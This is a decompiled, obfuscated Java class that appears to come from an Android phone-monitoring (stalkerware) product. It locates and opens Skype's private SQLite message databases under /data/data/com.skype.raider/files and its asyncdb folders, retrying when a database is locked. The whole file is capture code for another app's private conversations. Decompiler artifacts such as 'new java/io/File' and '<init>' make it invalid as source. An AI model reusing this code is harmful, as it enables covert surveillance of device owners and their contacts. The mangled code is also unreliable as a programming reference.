package com.vvt.capture.e.b.a;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.capture.e.d;
import java.io.File;

public class a
{
  private static final boolean a;
  private static final boolean b;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.ak.a.e;
      return;
    }
  }
  
  private static SQLiteDatabase a(int paramInt, String paramString1, String paramString2)
  {
    boolean bool1 = false;
    SQLiteDatabase localSQLiteDatabase = null;
    int i = 3;
    int j = 2;
    int k = 1;
    if (paramString2 == null) {}
    for (Object localObject1 = d.b();; localObject1 = paramString2)
    {
      if (localObject1 != null)
      {
        Object localObject2 = new Object[i];
        String str = "/data/data/com.skype.raider/files";
        localObject2[0] = str;
        localObject2[k] = localObject1;
        localObject2[j] = paramString1;
        Object localObject3 = String.format("%s/%s/%s", (Object[])localObject2);
        localObject2 = new java/io/File;
        ((File)localObject2).<init>((String)localObject3);
        boolean bool2 = ((File)localObject2).exists();
        boolean bool3;
        if (bool2)
        {
          bool3 = a;
          if (bool3) {}
          localObject1 = localObject3;
        }
        for (;;)
        {
          boolean bool4 = com.vvt.ag.b.a((String)localObject1);
          if (bool4) {
            break;
          }
          localSQLiteDatabase = a((String)localObject1, paramInt);
          int m = 5;
          while ((localSQLiteDatabase == null) && (m > 0))
          {
            bool1 = a;
            if (bool1) {}
            long l = 1000L;
            SystemClock.sleep(l);
            localSQLiteDatabase = a((String)localObject1, paramInt);
            m += -1;
          }
          localObject3 = "live:";
          boolean bool5 = ((String)localObject1).startsWith((String)localObject3);
          if (bool5)
          {
            localObject3 = "live:";
            localObject2 = "";
            localObject1 = ((String)localObject1).replace((CharSequence)localObject3, (CharSequence)localObject2);
          }
          localObject2 = new Object[i];
          str = "/data/data/com.skype.raider/files";
          localObject2[0] = str;
          localObject2[k] = localObject1;
          localObject2[j] = paramString1;
          localObject1 = String.format("%s/live#3a%s/%s", (Object[])localObject2);
          localObject3 = new java/io/File;
          ((File)localObject3).<init>((String)localObject1);
          bool5 = ((File)localObject3).exists();
          if (bool5)
          {
            bool5 = a;
            if (!bool5) {}
          }
          else
          {
            bool3 = b;
            if (bool3) {}
            bool3 = false;
            localObject1 = null;
          }
        }
      }
      return localSQLiteDatabase;
    }
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    bool = false;
    try
    {
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  public static SQLiteDatabase a(String paramString1, String paramString2)
  {
    if (paramString1 == null)
    {
      boolean bool = b;
      if (bool) {}
      bool = false;
    }
    int i;
    for (SQLiteDatabase localSQLiteDatabase = null;; localSQLiteDatabase = a(i, paramString1, paramString2))
    {
      return localSQLiteDatabase;
      i = 17;
    }
  }
  
  private static SQLiteDatabase b(int paramInt, String paramString1, String paramString2)
  {
    int i = 0;
    Object localObject1 = null;
    if (paramString2 == null) {
      paramString2 = d.b();
    }
    String str1;
    Object localObject2;
    int m;
    Object localObject3;
    int n;
    if (paramString2 != null)
    {
      str1 = com.vvt.n.a.e.b.c(paramString2);
      int k = 3;
      localObject2 = new Object[k];
      localObject2[0] = str1;
      String str2 = "asyncdb";
      localObject2[1] = str2;
      m = 2;
      localObject2[m] = paramString1;
      str1 = String.format("%s/%s/%s", (Object[])localObject2);
      localObject3 = new java/io/File;
      ((File)localObject3).<init>(str1);
      n = ((File)localObject3).exists();
      if (n == 0) {
        break label184;
      }
      n = a;
      if (n == 0) {}
    }
    for (;;)
    {
      n = com.vvt.ag.b.a(str1);
      if (n == 0)
      {
        localObject3 = a(str1, paramInt);
        i = 5;
        localObject1 = localObject3;
        n = i;
        while ((localObject1 == null) && (n > 0))
        {
          boolean bool = a;
          if (bool) {}
          long l = 1000L;
          SystemClock.sleep(l);
          localObject2 = a(str1, paramInt);
          int j = n + -1;
          n = j;
          localObject1 = localObject2;
        }
      }
      return (SQLiteDatabase)localObject1;
      label184:
      m = 0;
      str1 = null;
    }
  }
  
  public static SQLiteDatabase b(String paramString1, String paramString2)
  {
    if (paramString2 == null)
    {
      boolean bool = b;
      if (bool) {}
      bool = false;
    }
    int i;
    for (SQLiteDatabase localSQLiteDatabase = null;; localSQLiteDatabase = c(i, paramString2, paramString1))
    {
      return localSQLiteDatabase;
      i = 17;
    }
  }
  
  private static SQLiteDatabase c(int paramInt, String paramString1, String paramString2)
  {
    int i = 0;
    Object localObject1 = null;
    if (paramString2 == null) {
      paramString2 = d.b();
    }
    String str1;
    Object localObject2;
    int m;
    Object localObject3;
    int n;
    if (paramString2 != null)
    {
      str1 = com.vvt.n.a.e.b.d(paramString2);
      int k = 3;
      localObject2 = new Object[k];
      localObject2[0] = str1;
      String str2 = "asyncdb";
      localObject2[1] = str2;
      m = 2;
      localObject2[m] = paramString1;
      str1 = String.format("%s/%s/%s", (Object[])localObject2);
      localObject3 = new java/io/File;
      ((File)localObject3).<init>(str1);
      n = ((File)localObject3).exists();
      if (n == 0) {
        break label184;
      }
      n = a;
      if (n == 0) {}
    }
    for (;;)
    {
      n = com.vvt.ag.b.a(str1);
      if (n == 0)
      {
        localObject3 = a(str1, paramInt);
        i = 5;
        localObject1 = localObject3;
        n = i;
        while ((localObject1 == null) && (n > 0))
        {
          boolean bool = a;
          if (bool) {}
          long l = 1000L;
          SystemClock.sleep(l);
          localObject2 = a(str1, paramInt);
          int j = n + -1;
          n = j;
          localObject1 = localObject2;
        }
      }
      return (SQLiteDatabase)localObject1;
      label184:
      m = 0;
      str1 = null;
    }
  }
  
  public static SQLiteDatabase c(String paramString1, String paramString2)
  {
    if (paramString1 == null)
    {
      boolean bool = b;
      if (bool) {}
      bool = false;
    }
    int i;
    for (SQLiteDatabase localSQLiteDatabase = null;; localSQLiteDatabase = b(i, paramString1, paramString2))
    {
      return localSQLiteDatabase;
      i = 17;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/removeFromPath/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */